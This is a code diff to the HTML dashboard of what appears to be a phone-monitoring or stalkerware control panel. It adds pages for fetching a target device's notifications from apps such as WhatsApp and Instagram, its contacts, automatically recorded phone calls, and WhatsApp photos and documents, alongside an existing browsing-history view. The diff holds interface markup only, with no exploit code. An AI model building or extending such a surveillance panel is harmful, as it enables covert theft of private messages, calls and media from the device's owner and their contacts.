@@ -63,6 +63,22 @@
             <span class="icon">🕐</span>
             <span>History</span>
           </a>
+          <a class="nav-item" data-page="notifications" onclick="navigateTo('notifications')">
+            <span class="icon">🔔</span>
+            <span>Notifications</span>
+          </a>
+          <a class="nav-item" data-page="contacts" onclick="navigateTo('contacts')">
+            <span class="icon">👥</span>
+            <span>Contacts</span>
+          </a>
+          <a class="nav-item" data-page="recordings" onclick="navigateTo('recordings')">
+            <span class="icon">🎙️</span>
+            <span>Call Recordings</span>
+          </a>
+          <a class="nav-item" data-page="whatsapp" onclick="navigateTo('whatsapp')">
+            <span class="icon">📱</span>
+            <span>WhatsApp Media</span>
+          </a>
         </div>
 
         <div class="nav-section">
@@ -387,6 +403,102 @@
             <h3>No History</h3>
             <p>Select a device and fetch browsing history</p>
             <p style="font-size:13px;color:var(--text-muted);margin-top:8px">Agent page open hone ke baad ki activity track hogi</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ NOTIFICATIONS ============ -->
+      <section class="page-section" id="page-notifications">
+        <div class="page-header">
+          <div>
+            <h2>Notifications</h2>
+            <p class="subtitle">All notifications from device (WhatsApp, Instagram, etc.)</p>
+          </div>
+          <select id="notificationsDeviceSelect" class="device-select" onchange="onNotificationsDeviceChange()"></select>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchNotifications()">🔔 Fetch Notifications</button>
+          <span id="notifCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="call-log-list" id="notificationsList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">🔔</div>
+            <h3>No Notifications</h3>
+            <p>Enable Notification Access on device first</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CONTACTS ============ -->
+      <section class="page-section" id="page-contacts">
+        <div class="page-header">
+          <div>
+            <h2>Contacts</h2>
+            <p class="subtitle">All contacts from device</p>
+          </div>
+          <select id="contactsDeviceSelect" class="device-select" onchange="onContactsDeviceChange()"></select>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchContacts()">👥 Fetch Contacts</button>
+          <span id="contactsCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="call-log-list" id="contactsList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">👥</div>
+            <h3>No Contacts</h3>
+            <p>Select a device and fetch contacts</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CALL RECORDINGS ============ -->
+      <section class="page-section" id="page-recordings">
+        <div class="page-header">
+          <div>
+            <h2>Call Recordings</h2>
+            <p class="subtitle">Automatically recorded phone calls</p>
+          </div>
+          <select id="recordingsDeviceSelect" class="device-select" onchange="onRecordingsDeviceChange()"></select>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchRecordings()">🎙️ Fetch Recordings</button>
+          <span id="recordingsCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="call-log-list" id="recordingsList">
+          <div class="empty-state" style="padding:60px 20px">
+            <div class="icon">🎙️</div>
+            <h3>No Recordings</h3>
+            <p>Calls will be recorded automatically when the app is running</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ WHATSAPP MEDIA ============ -->
+      <section class="page-section" id="page-whatsapp">
+        <div class="page-header">
+          <div>
+            <h2>WhatsApp Media</h2>
+            <p class="subtitle">Photos, videos, and documents from WhatsApp</p>
+          </div>
+          <select id="whatsappDeviceSelect" class="device-select" onchange="onWhatsappDeviceChange()"></select>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
+          <button class="btn btn-primary" onclick="fetchWhatsApp()">📱 Fetch WhatsApp Media</button>
+          <span id="whatsappCount" style="color:var(--text-secondary);font-size:14px;align-self:center"></span>
+        </div>
+
+        <div class="gallery-grid" id="whatsappGrid">
+          <div class="empty-state" style="padding:60px 20px;grid-column:1/-1">
+            <div class="icon">📱</div>
+            <h3>No WhatsApp Media</h3>
+            <p>Select device and fetch WhatsApp photos/media</p>
           </div>
         </div>
       </section>
